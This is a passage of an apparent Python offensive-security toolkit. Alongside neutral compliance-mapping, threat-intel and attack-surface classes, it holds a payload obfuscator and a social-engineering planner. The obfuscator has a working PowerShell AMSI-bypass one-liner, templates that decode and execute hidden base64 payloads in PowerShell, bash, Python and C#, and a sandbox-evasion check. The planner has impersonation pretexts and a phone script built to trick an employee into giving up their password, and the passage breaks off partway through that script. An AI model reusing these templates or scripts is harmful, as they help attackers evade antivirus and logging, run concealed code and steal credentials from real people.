                    'T1190': ['A.8.8', 'A.8.9', 'A.8.20'],
                    'T1566': ['A.6.3', 'A.8.7', 'A.8.23'],
                    'T1003': ['A.5.15', 'A.8.3', 'A.8.5'],
                    'T1021': ['A.8.2', 'A.8.15', 'A.8.20'],
                    'T1486': ['A.8.13', 'A.8.14'],
                    'T1048': ['A.5.14', 'A.8.12']
                }
            },
            'pci_dss': {
                'name': 'PCI DSS 4.0',
                'mapping': {
                    'T1190': ['6.2', '6.3', '11.3'],
                    'T1566': ['12.6', '9.4'],
                    'T1003': ['8.2', '8.3', '8.6'],
                    'T1021': ['2.2', '7.2', '8.3'],
                    'T1486': ['12.10'],
                    'T1048': ['3.4', '4.1', '10.4']
                }
            },
            'hipaa': {
                'name': 'HIPAA Security Rule',
                'mapping': {
                    'T1190': ['164.312(a)(1)', '164.312(e)(1)'],
                    'T1566': ['164.308(a)(5)', '164.312(e)(1)'],
                    'T1003': ['164.312(a)(1)', '164.312(d)'],
                    'T1021': ['164.312(a)(1)', '164.312(d)'],
                    'T1486': ['164.308(a)(7)', '164.310(d)(1)'],
                    'T1048': ['164.312(e)(1)', '164.312(e)(2)']
                }
            },
            'mitre_defend': {
                'name': 'MITRE D3FEND',
                'mapping': {
                    'T1190': ['D3-AI', 'D3-AVE', 'D3-NI'],
                    'T1566': ['D3-ET', 'D3-UA', 'D3-FAPA'],
                    'T1003': ['D3-CH', 'D3-CL', 'D3-MAC'],
                    'T1021': ['D3-RBA', 'D3-RTSD', 'D3-NI'],
                    'T1486': ['D3-BA', 'D3-FV'],
                    'T1048': ['D3-NI', 'D3-DA', 'D3-DH']
                }
            }
        }
        
    def get_compliance_mapping(self, technique_id: str) -> Dict[str, List[str]]:
        """Get all compliance control mappings for a technique."""
        mappings = {}
        
        for framework_id, framework in self.frameworks.items():
            controls = framework.get('mapping', {}).get(technique_id, [])
            if controls:
                mappings[framework['name']] = controls
                
        return mappings
    
    def get_controls_for_chain(self, 
                               techniques: List[str]) -> Dict[str, Set[str]]:
        """Get all compliance controls relevant to an attack chain."""
        all_controls: Dict[str, Set[str]] = {}
        
        for technique in techniques:
            mappings = self.get_compliance_mapping(technique)
            for framework, controls in mappings.items():
                if framework not in all_controls:
                    all_controls[framework] = set()
                all_controls[framework].update(controls)
                
        return all_controls
    
    def generate_compliance_report(self, 
                                   techniques: List[str]) -> str:
        """Generate a compliance impact report."""
        controls = self.get_controls_for_chain(techniques)
        
        lines = [
            "=" * 60,
            "üìã COMPLIANCE IMPACT ASSESSMENT",
            "=" * 60,
            "",
            f"Techniques Analyzed: {len(techniques)}",
            f"Frameworks Impacted: {len(controls)}",
            ""
        ]
        
        for framework, control_set in controls.items():
            lines.append(f"üìå {framework}")
            lines.append("-" * 40)
            for control in sorted(control_set):
                lines.append(f"   ‚Ä¢ {control}")
            lines.append("")
        
        lines.extend([
            "=" * 60,
            "RECOMMENDATIONS:",
            "‚Ä¢ Review controls listed above for gaps",
            "‚Ä¢ Update security policies if needed",
            "‚Ä¢ Document findings for audit purposes",
            "=" * 60
        ])
        
        return "\n".join(lines)
    
    def check_compliance_gaps(self, implemented_controls: Dict[str, List[str]],
                             techniques: List[str]) -> Dict[str, Any]:
        """Check for compliance gaps based on attack chain."""
        required = self.get_controls_for_chain(techniques)
        gaps = {}
        covered = {}
        
        for framework, required_controls in required.items():
            impl = set(implemented_controls.get(framework, []))
            missing = required_controls - impl
            present = required_controls & impl
            
            if missing:
                gaps[framework] = list(missing)
            if present:
                covered[framework] = list(present)
                
        coverage_percent = 0
        total_required = sum(len(c) for c in required.values())
        total_covered = sum(len(c) for c in covered.values())
        
        if total_required > 0:
            coverage_percent = (total_covered / total_required) * 100
            
        return {
            'gaps': gaps,
            'covered': covered,
            'coverage_percent': coverage_percent,
            'total_controls_required': total_required,
            'controls_implemented': total_covered
        }


class ThreatIntelligenceFeed:
    """Aggregate and correlate threat intelligence data."""
    
    def __init__(self):
        self.feeds: Dict[str, Dict[str, Any]] = {
            'alienvault_otx': {
                'name': 'AlienVault OTX',
                'type': 'commercial_free',
                'url': 'https://otx.alienvault.com',
                'formats': ['stix', 'csv', 'json'],
                'ioc_types': ['ip', 'domain', 'hash', 'url']
            },
            'abuse_ch': {
                'name': 'abuse.ch',
                'type': 'open_source',
                'feeds': ['malwarebazaar', 'urlhaus', 'threatfox'],
                'ioc_types': ['hash', 'url', 'domain']
            },
            'misp_communities': {
                'name': 'MISP Communities',
                'type': 'community',
                'formats': ['misp_json', 'stix'],
                'sharing_groups': True
            },
            'virustotal': {
                'name': 'VirusTotal',
                'type': 'commercial',
                'capabilities': ['file_analysis', 'url_analysis', 'retrohunt'],
                'api_quota': 500
            },
            'shodan': {
                'name': 'Shodan',
                'type': 'commercial',
                'capabilities': ['device_search', 'vulnerability_detection'],
                'data_types': ['ip', 'port', 'service', 'vuln']
            },
            'greynoise': {
                'name': 'GreyNoise',
                'type': 'commercial',
                'capabilities': ['internet_noise', 'malicious_scanner'],
                'context': 'attack_source_classification'
            },
            'censys': {
                'name': 'Censys',
                'type': 'commercial',
                'capabilities': ['certificate_search', 'host_search'],
                'data_types': ['certificate', 'ip', 'domain']
            }
        }
        
        self.indicators: Dict[str, Dict[str, Any]] = {}
        self.threat_actors: Dict[str, Dict[str, Any]] = {
            'APT28': {
                'aliases': ['Fancy Bear', 'Sofacy', 'Sednit'],
                'origin': 'Russia',
                'targets': ['government', 'military', 'media'],
                'techniques': ['T1566', 'T1059', 'T1003', 'T1027']
            },
            'APT29': {
                'aliases': ['Cozy Bear', 'The Dukes'],
                'origin': 'Russia',
                'targets': ['government', 'think_tanks'],
                'techniques': ['T1190', 'T1059', 'T1078']
            },
            'APT38': {
                'aliases': ['Lazarus Group', 'HIDDEN COBRA'],
                'origin': 'North Korea',
                'targets': ['financial', 'cryptocurrency'],
                'techniques': ['T1566', 'T1204', 'T1486']
            },
            'APT41': {
                'aliases': ['Winnti', 'Barium'],
                'origin': 'China',
                'targets': ['gaming', 'healthcare', 'technology'],
                'techniques': ['T1195', 'T1059', 'T1003']
            },
            'FIN7': {
                'aliases': ['Carbanak', 'Navigator'],
                'origin': 'Criminal',
                'targets': ['retail', 'hospitality', 'restaurant'],
                'techniques': ['T1566', 'T1059', 'T1547']
            }
        }
        
    def add_indicator(self, ioc_type: str, value: str, 
                     source: str, threat_level: str,
                     associated_actor: str = None) -> str:
        """Add a new indicator of compromise."""
        ioc_id = f"IOC-{len(self.indicators)+1:06d}"
        
        self.indicators[ioc_id] = {
            'id': ioc_id,
            'type': ioc_type,  # ip, domain, hash, url, email
            'value': value,
            'source': source,
            'threat_level': threat_level,  # low, medium, high, critical
            'associated_actor': associated_actor,
            'first_seen': datetime.now().isoformat(),
            'last_seen': datetime.now().isoformat(),
            'confidence': 0.8,
            'tags': [],
            'related_iocs': []
        }
        
        return ioc_id
    
    def correlate_with_chain(self, chain_iocs: List[str]) -> Dict[str, Any]:
        """Correlate chain IOCs with threat intelligence."""
        matches = []
        actors_identified = set()
        
        for ioc in chain_iocs:
            for stored_ioc in self.indicators.values():
                if stored_ioc['value'] == ioc:
                    matches.append(stored_ioc)
                    if stored_ioc.get('associated_actor'):
                        actors_identified.add(stored_ioc['associated_actor'])
        
        return {
            'matched_iocs': len(matches),
            'matches': matches,
            'threat_actors': list(actors_identified),
            'highest_threat_level': self._get_highest_threat(matches)
        }
    
    def _get_highest_threat(self, iocs: List[Dict]) -> str:
        """Get highest threat level from IOC list."""
        levels = {'low': 1, 'medium': 2, 'high': 3, 'critical': 4}
        max_level = 0
        max_name = 'unknown'
        
        for ioc in iocs:
            level = levels.get(ioc.get('threat_level', 'low'), 0)
            if level > max_level:
                max_level = level
                max_name = ioc.get('threat_level', 'unknown')
                
        return max_name
    
    def get_actor_ttp_overlap(self, chain_techniques: List[str]) -> Dict[str, float]:
        """Calculate TTP overlap with known threat actors."""
        overlaps = {}
        
        for actor_name, actor in self.threat_actors.items():
            actor_ttps = set(actor.get('techniques', []))
            chain_ttps = set(chain_techniques)
            
            if actor_ttps:
                overlap = len(actor_ttps & chain_ttps) / len(actor_ttps)
                if overlap > 0:
                    overlaps[actor_name] = overlap
                    
        return dict(sorted(overlaps.items(), key=lambda x: x[1], reverse=True))
    
    def generate_intel_report(self, chain_techniques: List[str],
                             observed_iocs: List[str]) -> str:
        """Generate threat intelligence report."""
        actor_overlaps = self.get_actor_ttp_overlap(chain_techniques)
        ioc_correlation = self.correlate_with_chain(observed_iocs)
        
        lines = [
            "=" * 70,
            "üîç THREAT INTELLIGENCE REPORT",
            "=" * 70,
            "",
            "üìä ANALYSIS SUMMARY",
            f"   Techniques Analyzed: {len(chain_techniques)}",
            f"   IOCs Checked: {len(observed_iocs)}",
            f"   IOC Matches: {ioc_correlation['matched_iocs']}",
            "",
            "üë• THREAT ACTOR ATTRIBUTION"
        ]
        
        if actor_overlaps:
            for actor, overlap in list(actor_overlaps.items())[:5]:
                actor_info = self.threat_actors.get(actor, {})
                aliases = ', '.join(actor_info.get('aliases', [])[:2])
                lines.append(f"   {actor} ({aliases}): {overlap*100:.1f}% TTP match")
        else:
            lines.append("   No significant actor overlap detected")
            
        lines.extend([
            "",
            "‚ö†Ô∏è THREAT LEVEL",
            f"   Based on IOC correlation: {ioc_correlation['highest_threat_level'].upper()}",
            "",
            "üìå RECOMMENDED ACTIONS",
            "   ‚Ä¢ Cross-reference with internal SIEM data",
            "   ‚Ä¢ Update detection rules for identified TTPs",
            "   ‚Ä¢ Monitor for related activity patterns",
            "=" * 70
        ])
        
        return "\n".join(lines)


class VulnerabilityChainAnalyzer:
    """Analyze vulnerability chains and exploit paths."""
    
    def __init__(self):
        self.vulnerability_db: Dict[str, Dict[str, Any]] = {}
        self.exploit_paths: List[Dict[str, Any]] = []
        self.vulnerability_classes = {
            'memory_corruption': {
                'types': ['buffer_overflow', 'use_after_free', 'heap_overflow'],
                'typical_impact': 'code_execution',
                'exploit_complexity': 'high'
            },
            'injection': {
                'types': ['sql_injection', 'command_injection', 'ldap_injection'],
                'typical_impact': 'data_access',
                'exploit_complexity': 'low'
            },
            'authentication': {
                'types': ['broken_auth', 'session_fixation', 'credential_exposure'],
                'typical_impact': 'privilege_escalation',
                'exploit_complexity': 'medium'
            },
            'configuration': {
                'types': ['misconfig', 'default_creds', 'exposed_admin'],
                'typical_impact': 'unauthorized_access',
                'exploit_complexity': 'low'
            },
            'deserialization': {
                'types': ['insecure_deserialization', 'object_injection'],
                'typical_impact': 'code_execution',
                'exploit_complexity': 'medium'
            }
        }
        
    def add_vulnerability(self, cve_id: str, cvss_score: float,
                         affected_component: str, vuln_class: str,
                         exploit_available: bool = False) -> None:
        """Add vulnerability to the database."""
        self.vulnerability_db[cve_id] = {
            'cve_id': cve_id,
            'cvss_score': cvss_score,
            'affected_component': affected_component,
            'vuln_class': vuln_class,
            'exploit_available': exploit_available,
            'added_at': datetime.now().isoformat(),
            'chained_with': [],
            'impact': self.vulnerability_classes.get(vuln_class, {}).get('typical_impact', 'unknown')
        }
    
    def find_chainable_vulns(self, initial_vuln: str) -> List[Dict[str, Any]]:
        """Find vulnerabilities that can chain with the initial one."""
        initial = self.vulnerability_db.get(initial_vuln)
        if not initial:
            return []
            
        chainable = []
        initial_impact = initial.get('impact', '')
        
        for cve_id, vuln in self.vulnerability_db.items():
            if cve_id == initial_vuln:
                continue
                
            # Check if impacts align for chaining
            if initial_impact == 'unauthorized_access':
                # Can chain with privesc or code exec
                if vuln['impact'] in ['privilege_escalation', 'code_execution']:
                    chainable.append({
                        'cve': cve_id,
                        'chain_type': 'access_to_execution',
                        'combined_severity': max(initial['cvss_score'], vuln['cvss_score'])
                    })
            elif initial_impact == 'data_access':
                # Can chain with credential exposure
                if vuln['vuln_class'] == 'authentication':
                    chainable.append({
                        'cve': cve_id,
                        'chain_type': 'data_to_auth',
                        'combined_severity': max(initial['cvss_score'], vuln['cvss_score'])
                    })
                    
        return sorted(chainable, key=lambda x: x['combined_severity'], reverse=True)
    
    def analyze_exploit_chain(self, cve_chain: List[str]) -> Dict[str, Any]:
        """Analyze a chain of vulnerabilities."""
        vulns = [self.vulnerability_db.get(cve) for cve in cve_chain 
                if cve in self.vulnerability_db]
        
        if not vulns:
            return {'error': 'No valid vulnerabilities in chain'}
            
        chain_complexity = 'low'
        exploit_available_all = all(v.get('exploit_available', False) for v in vulns)
        max_cvss = max(v.get('cvss_score', 0) for v in vulns)
        
        # Calculate chain complexity
        complexities = []
        for v in vulns:
            vuln_class = v.get('vuln_class', '')
            class_info = self.vulnerability_classes.get(vuln_class, {})
            complexities.append(class_info.get('exploit_complexity', 'medium'))
        
        if 'high' in complexities:
            chain_complexity = 'high'
        elif complexities.count('medium') >= 2:
            chain_complexity = 'medium'
            
        return {
            'chain_length': len(vulns),
            'max_cvss': max_cvss,
            'chain_complexity': chain_complexity,
            'all_exploits_available': exploit_available_all,
            'impacts': [v.get('impact') for v in vulns],
            'components_affected': [v.get('affected_component') for v in vulns],
            'exploitation_order': cve_chain
        }


class AttackSurfaceMapper:
    """Map and analyze attack surface of target environment."""
    
    def __init__(self):
        self.assets: Dict[str, Dict[str, Any]] = {}
        self.exposure_levels = {
            'internet_facing': {'risk_multiplier': 3.0, 'icon': 'üåê'},
            'dmz': {'risk_multiplier': 2.0, 'icon': 'üõ°Ô∏è'},
            'internal': {'risk_multiplier': 1.0, 'icon': 'üè¢'},
            'restricted': {'risk_multiplier': 0.5, 'icon': 'üîí'}
        }
        
    def add_asset(self, name: str, asset_type: str, exposure: str,
                 services: List[Dict[str, Any]], criticality: str) -> str:
        """Add an asset to the attack surface map."""
        asset_id = f"ASSET-{len(self.assets)+1:04d}"
        
        base_risk = {'low': 1, 'medium': 2, 'high': 3, 'critical': 4}.get(criticality, 2)
        exposure_mult = self.exposure_levels.get(exposure, {}).get('risk_multiplier', 1.0)
        
        self.assets[asset_id] = {
            'id': asset_id,
            'name': name,
            'type': asset_type,  # server, workstation, network_device, iot, cloud
            'exposure': exposure,
            'services': services,
            'criticality': criticality,
            'risk_score': base_risk * exposure_mult,
            'vulnerabilities': [],
            'attack_paths': []
        }
        
        return asset_id
    
    def add_service(self, asset_id: str, port: int, protocol: str,
                   service_name: str, version: str = None,
                   authenticated: bool = True) -> None:
        """Add a service to an asset."""
        if asset_id in self.assets:
            self.assets[asset_id]['services'].append({
                'port': port,
                'protocol': protocol,
                'service': service_name,
                'version': version,
                'authenticated': authenticated,
                'potential_vulns': self._check_known_vulns(service_name, version)
            })
    
    def _check_known_vulns(self, service: str, version: str) -> List[str]:
        """Check for known vulnerabilities in service/version."""
        known_vulns = {
            'apache': {'2.4.49': ['CVE-2021-41773'], '2.4.50': ['CVE-2021-42013']},
            'openssh': {'7.4': ['CVE-2018-15473']},
            'nginx': {'1.6.2': ['CVE-2014-3616']},
            'mysql': {'5.7': ['CVE-2016-6662']},
            'smb': {'1.0': ['CVE-2017-0144', 'CVE-2017-0145']}
        }
        
        service_lower = service.lower()
        if service_lower in known_vulns and version:
            return known_vulns[service_lower].get(version, [])
        return []
    
    def calculate_attack_surface_score(self) -> Dict[str, Any]:
        """Calculate overall attack surface score."""
        total_risk = 0
        internet_exposed = 0
        unauthenticated_services = 0
        critical_assets = 0
        
        for asset in self.assets.values():
            total_risk += asset['risk_score']
            
            if asset['exposure'] == 'internet_facing':
                internet_exposed += 1
                
            if asset['criticality'] in ['high', 'critical']:
                critical_assets += 1
                
            for service in asset['services']:
                if not service.get('authenticated', True):
                    unauthenticated_services += 1
        
        # Normalize score to 0-100
        max_possible = len(self.assets) * 4 * 3  # max criticality * max exposure
        normalized_score = (total_risk / max_possible * 100) if max_possible > 0 else 0
        
        return {
            'total_assets': len(self.assets),
            'attack_surface_score': min(100, normalized_score),
            'internet_exposed_assets': internet_exposed,
            'unauthenticated_services': unauthenticated_services,
            'critical_assets': critical_assets,
            'risk_level': self._get_risk_level(normalized_score)
        }
    
    def _get_risk_level(self, score: float) -> str:
        """Convert score to risk level."""
        if score >= 75:
            return 'CRITICAL'
        elif score >= 50:
            return 'HIGH'
        elif score >= 25:
            return 'MEDIUM'
        return 'LOW'
    
    def find_attack_paths(self, entry_point_id: str, 
                         target_id: str) -> List[Dict[str, Any]]:
        """Find possible attack paths between assets."""
        paths = []
        entry = self.assets.get(entry_point_id)
        target = self.assets.get(target_id)
        
        if not entry or not target:
            return paths
            
        # Simple path finding based on exposure levels
        exposure_order = ['internet_facing', 'dmz', 'internal', 'restricted']
        entry_level = exposure_order.index(entry['exposure']) if entry['exposure'] in exposure_order else 0
        target_level = exposure_order.index(target['exposure']) if target['exposure'] in exposure_order else 0
        
        if target_level >= entry_level:
            # Need to traverse through security zones
            path = {
                'entry': entry['name'],
                'target': target['name'],
                'hops': target_level - entry_level + 1,
                'difficulty': 'hard' if target_level - entry_level > 1 else 'medium',
                'required_pivots': target_level - entry_level
            }
            paths.append(path)
            
        return paths
    
    def generate_attack_surface_map(self) -> str:
        """Generate ASCII visualization of attack surface."""
        lines = [
            "=" * 70,
            "üó∫Ô∏è ATTACK SURFACE MAP",
            "=" * 70,
            ""
        ]
        
        # Group by exposure
        by_exposure: Dict[str, List] = {}
        for asset in self.assets.values():
            exp = asset['exposure']
            if exp not in by_exposure:
                by_exposure[exp] = []
            by_exposure[exp].append(asset)
        
        exposure_order = ['internet_facing', 'dmz', 'internal', 'restricted']
        
        for exposure in exposure_order:
            if exposure in by_exposure:
                exp_info = self.exposure_levels.get(exposure, {})
                icon = exp_info.get('icon', 'üì¶')
                
                lines.append(f"{icon} {exposure.upper().replace('_', ' ')}")
                lines.append("‚îÄ" * 50)
                
                for asset in by_exposure[exposure]:
                    crit_icons = {'low': 'üü¢', 'medium': 'üü°', 'high': 'üü†', 'critical': 'üî¥'}
                    crit_icon = crit_icons.get(asset['criticality'], '‚ö™')
                    
                    lines.append(f"  {crit_icon} {asset['name']} ({asset['type']})")
                    
                    for service in asset['services'][:3]:
                        auth_icon = 'üîê' if service.get('authenticated') else '‚ö†Ô∏è'
                        lines.append(f"      {auth_icon} :{service['port']}/{service['protocol']} - {service['service']}")
                    
                lines.append("")
        
        # Add summary
        summary = self.calculate_attack_surface_score()
        lines.extend([
            "=" * 70,
            f"üìä ATTACK SURFACE SCORE: {summary['attack_surface_score']:.1f}/100 ({summary['risk_level']})",
            f"   Internet Exposed: {summary['internet_exposed_assets']} | "
            f"Critical Assets: {summary['critical_assets']} | "
            f"Unauth Services: {summary['unauthenticated_services']}",
            "=" * 70
        ])
        
        return "\n".join(lines)


class PayloadObfuscator:
    """Advanced payload obfuscation engine."""
    
    def __init__(self):
        self.obfuscation_techniques: Dict[str, Dict[str, Any]] = {
            'string_encoding': {
                'name': 'String Encoding',
                'methods': ['base64', 'hex', 'rot13', 'xor', 'aes'],
                'detection_bypass': 'signature',
                'complexity': 'low'
            },
            'code_flow': {
                'name': 'Code Flow Obfuscation',
                'methods': ['control_flow_flattening', 'opaque_predicates', 'dead_code'],
                'detection_bypass': 'static_analysis',
                'complexity': 'high'
            },
            'polymorphic': {
                'name': 'Polymorphic Engine',
                'methods': ['instruction_substitution', 'register_reassignment', 'metamorphic'],
                'detection_bypass': 'signature',
                'complexity': 'very_high'
            },
            'packing': {
                'name': 'Packing/Crypting',
                'methods': ['upx', 'themida', 'vmprotect', 'custom_crypter'],
                'detection_bypass': 'signature',
                'complexity': 'medium'
            },
            'sandbox_evasion': {
                'name': 'Sandbox Evasion',
                'methods': ['sleep_acceleration', 'user_interaction', 'environment_check'],
                'detection_bypass': 'dynamic_analysis',
                'complexity': 'medium'
            },
            'amsi_bypass': {
                'name': 'AMSI Bypass',
                'methods': ['patch_amsi', 'reflection', 'memory_patching'],
                'detection_bypass': 'amsi',
                'complexity': 'medium',
                'platform': 'windows'
            },
            'etw_bypass': {
                'name': 'ETW Bypass',
                'methods': ['patch_ntdll', 'unhook'],
                'detection_bypass': 'etw_logging',
                'complexity': 'high',
                'platform': 'windows'
            }
        }
        
        self.evasion_templates: Dict[str, str] = {
            'powershell_base64': '''
$encoded = "{payload_b64}"
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
IEX $decoded
''',
            'powershell_amsi_bypass': '''
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
''',
            'python_exec_obfuscated': '''
import base64,codecs
exec(codecs.decode(base64.b64decode("{payload_b64}"),"rot_13"))
''',
            'bash_base64': '''
echo "{payload_b64}" | base64 -d | bash
''',
            'csharp_reflection': '''
var assembly = Assembly.Load(Convert.FromBase64String("{payload_b64}"));
var type = assembly.GetType("{class_name}");
var method = type.GetMethod("{method_name}");
method.Invoke(null, null);
'''
        }
        
    def obfuscate_string(self, payload: str, method: str) -> Dict[str, Any]:
        """Obfuscate a string payload."""
        result = {
            'original_length': len(payload),
            'method': method,
            'obfuscated': '',
            'deobfuscation_stub': ''
        }
        
        if method == 'base64':
            import base64
            result['obfuscated'] = base64.b64encode(payload.encode()).decode()
            result['deobfuscation_stub'] = 'base64.b64decode(payload).decode()'
        elif method == 'hex':
            result['obfuscated'] = payload.encode().hex()
            result['deobfuscation_stub'] = 'bytes.fromhex(payload).decode()'
        elif method == 'rot13':
            import codecs
            result['obfuscated'] = codecs.encode(payload, 'rot_13')
            result['deobfuscation_stub'] = 'codecs.decode(payload, "rot_13")'
        elif method == 'xor':
            key = 0x41
            obfuscated = ''.join(chr(ord(c) ^ key) for c in payload)
            result['obfuscated'] = obfuscated.encode('unicode_escape').decode()
            result['deobfuscation_stub'] = f'"".join(chr(ord(c) ^ {key}) for c in payload)'
        
        result['obfuscated_length'] = len(result['obfuscated'])
        return result
    
    def generate_evasive_payload(self, payload: str, platform: str,
                                 techniques: List[str]) -> Dict[str, Any]:
        """Generate an evasive payload with multiple techniques."""
        stages = []
        current_payload = payload
        
        for technique in techniques:
            tech_info = self.obfuscation_techniques.get(technique, {})
            
            if technique == 'string_encoding':
                obf = self.obfuscate_string(current_payload, 'base64')
                current_payload = obf['obfuscated']
                stages.append({
                    'technique': technique,
                    'method': 'base64',
                    'result_length': len(current_payload)
                })
                
            elif technique == 'sandbox_evasion':
                # Add sandbox check wrapper
                if platform == 'windows':
                    sandbox_check = '''
if (Get-Process | Where-Object {$_.ProcessName -match "vmware|vbox|sandbox"}) { exit }
Start-Sleep -Seconds 60
'''
                    current_payload = sandbox_check + current_payload
                stages.append({
                    'technique': technique,
                    'method': 'process_check_and_delay',
                    'added_checks': ['vm_detection', 'sleep']
                })
                
            elif technique == 'amsi_bypass' and platform == 'windows':
                current_payload = self.evasion_templates['powershell_amsi_bypass'] + current_payload
                stages.append({
                    'technique': technique,
                    'method': 'amsi_patch'
                })
        
        return {
            'original_payload': payload[:100] + '...' if len(payload) > 100 else payload,
            'platform': platform,
            'techniques_applied': techniques,
            'stages': stages,
            'final_payload_length': len(current_payload),
            'detection_bypasses': [self.obfuscation_techniques.get(t, {}).get('detection_bypass') 
                                  for t in techniques]
        }
    
    def get_recommended_techniques(self, platform: str, 
                                   target_defenses: List[str]) -> List[str]:
        """Recommend obfuscation techniques based on target defenses."""
        recommendations = []
        
        defense_mapping = {
            'av': ['string_encoding', 'packing', 'polymorphic'],
            'edr': ['code_flow', 'sandbox_evasion', 'etw_bypass'],
            'amsi': ['amsi_bypass', 'string_encoding'],
            'sandbox': ['sandbox_evasion'],
            'signature_based': ['polymorphic', 'string_encoding'],
            'behavioral': ['code_flow', 'sandbox_evasion']
        }
        
        for defense in target_defenses:
            if defense in defense_mapping:
                for tech in defense_mapping[defense]:
                    tech_info = self.obfuscation_techniques.get(tech, {})
                    if tech_info.get('platform', platform) == platform or 'platform' not in tech_info:
                        if tech not in recommendations:
                            recommendations.append(tech)
        
        return recommendations


class SocialEngineeringPlanner:
    """Plan and track social engineering campaigns."""
    
    def __init__(self):
        self.pretexts: Dict[str, Dict[str, Any]] = {
            'it_support': {
                'name': 'IT Support',
                'description': 'Impersonate IT help desk',
                'success_rate': 0.65,
                'required_info': ['company_name', 'it_department_name'],
                'best_timing': 'Monday morning or after outages',
                'target_emotions': ['urgency', 'fear', 'helpfulness']
            },
            'vendor': {
                'name': 'Vendor/Supplier',
                'description': 'Impersonate known vendor',
                'success_rate': 0.55,
                'required_info': ['vendor_name', 'account_rep', 'invoice_format'],
                'best_timing': 'End of month/quarter',
                'target_emotions': ['urgency', 'routine']
            },
            'executive': {
                'name': 'CEO/Executive',
                'description': 'Impersonate C-level executive',
                'success_rate': 0.45,
                'required_info': ['executive_name', 'email_style', 'travel_schedule'],
                'best_timing': 'When executive is traveling',
                'target_emotions': ['authority', 'urgency', 'fear']
            },
            'recruiter': {
                'name': 'Recruiter',
                'description': 'Impersonate job recruiter',
                'success_rate': 0.70,
                'required_info': ['job_title', 'company_name'],
                'best_timing': 'Any time',
                'target_emotions': ['greed', 'curiosity', 'ambition']
            },
            'delivery': {
                'name': 'Delivery Person',
                'description': 'Physical access via delivery pretext',
                'success_rate': 0.75,
                'required_info': ['delivery_company', 'uniform'],
                'best_timing': 'Business hours',
                'target_emotions': ['routine', 'helpfulness'],
                'physical': True
            },
            'maintenance': {
                'name': 'Maintenance Worker',
                'description': 'Physical access via maintenance pretext',
                'success_rate': 0.70,
                'required_info': ['maintenance_company', 'work_order'],
                'best_timing': 'Business hours',
                'target_emotions': ['routine', 'authority'],
                'physical': True
            }
        }
        
        self.campaigns: Dict[str, Dict[str, Any]] = {}
        self.osint_data: Dict[str, Any] = {}
        
    def gather_osint(self, target_org: str) -> Dict[str, Any]:
        """Simulate OSINT gathering for social engineering."""
        # This would integrate with actual OSINT tools
        osint = {
            'organization': target_org,
            'gathered_at': datetime.now().isoformat(),
            'employees': {
                'linkedin_profiles': 0,
                'email_format': '{first}.{last}@company.com',
                'key_personnel': []
            },
            'technology': {
                'email_provider': 'unknown',
                'vpn_vendor': 'unknown',
                'sso_provider': 'unknown'
            },
            'social_media': {
                'twitter': False,
                'facebook': False,
                'instagram': False
            },
            'physical': {
                'locations': [],
                'badge_type': 'unknown',
                'visitor_policy': 'unknown'
            }
        }
        
        self.osint_data[target_org] = osint
        return osint
    
    def plan_campaign(self, target_org: str, pretext_type: str,
                     targets: List[str], objective: str) -> str:
        """Plan a social engineering campaign."""
        campaign_id = f"SE-{len(self.campaigns)+1:04d}"
        pretext = self.pretexts.get(pretext_type, {})
        
        self.campaigns[campaign_id] = {
            'id': campaign_id,
            'target_org': target_org,
            'pretext': pretext_type,
            'pretext_details': pretext,
            'targets': targets,
            'objective': objective,
            'created_at': datetime.now().isoformat(),
            'status': 'planning',
            'phases': self._generate_campaign_phases(pretext_type, objective),
            'success_criteria': self._define_success_criteria(objective),
            'osint_required': pretext.get('required_info', []),
            'estimated_success_rate': pretext.get('success_rate', 0.5)
        }
        
        return campaign_id
    
    def _generate_campaign_phases(self, pretext_type: str, 
                                  objective: str) -> List[Dict[str, Any]]:
        """Generate campaign phases."""
        phases = [
            {
                'phase': 1,
                'name': 'Reconnaissance',
                'description': 'Gather OSINT on targets',
                'duration_days': 3
            },
            {
                'phase': 2,
                'name': 'Pretext Development',
                'description': 'Develop convincing pretext materials',
                'duration_days': 2
            },
            {
                'phase': 3,
                'name': 'Infrastructure Setup',
                'description': 'Set up phishing domains, clone pages, etc.',
                'duration_days': 1
            },
            {
                'phase': 4,
                'name': 'Initial Contact',
                'description': 'First contact with targets',
                'duration_days': 1
            },
            {
                'phase': 5,
                'name': 'Execution',
                'description': 'Execute primary attack',
                'duration_days': 2
            }
        ]
        
        if self.pretexts.get(pretext_type, {}).get('physical'):
            phases.insert(3, {
                'phase': 3.5,
                'name': 'Physical Preparation',
                'description': 'Prepare uniforms, props, cover story',
                'duration_days': 2
            })
            
        return phases
    
    def _define_success_criteria(self, objective: str) -> List[str]:
        """Define success criteria based on objective."""
        criteria_map = {
            'credential_harvest': [
                'Obtain valid credentials',
                'Bypass MFA if present',
                'Maintain access for 24 hours'
            ],
            'malware_delivery': [
                'Target executes payload',
                'Establish C2 connection',
                'Avoid immediate detection'
            ],
            'physical_access': [
                'Gain building access',
                'Access restricted areas',
                'Plant device or gather intel'
            ],
            'information_gathering': [
                'Obtain sensitive information',
                'Identify additional targets',
                'Map internal processes'
            ]
        }
        
        return criteria_map.get(objective, ['Achieve stated objective'])
    
    def generate_pretext_script(self, campaign_id: str) -> str:
        """Generate a pretext script for the campaign."""
        campaign = self.campaigns.get(campaign_id)
        if not campaign:
            return "Campaign not found"
            
        pretext_type = campaign['pretext']
        pretext = self.pretexts.get(pretext_type, {})
        
        scripts = {
            'it_support': '''
üìû IT SUPPORT PRETEXT SCRIPT
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ

OPENING:
"Hi, this is [Name] from IT Support. We're seeing some unusual 
activity on your account and need to verify a few things."

BUILD URGENCY:
"Your account may have been compromised. To prevent lockout, 
I need to verify your identity and reset your credentials."

OBTAIN CREDENTIALS:
"I've sent a verification link to your email. Can you click 
it and enter your current password so we can compare it against
our records?"

HANDLE OBJECTIONS:
- "I can't give my password" ‚Üí "This is just for verification, 
  our system will encrypt it immediately."
- "Let me call IT" ‚Üí "I'm actually trying to reach you because 
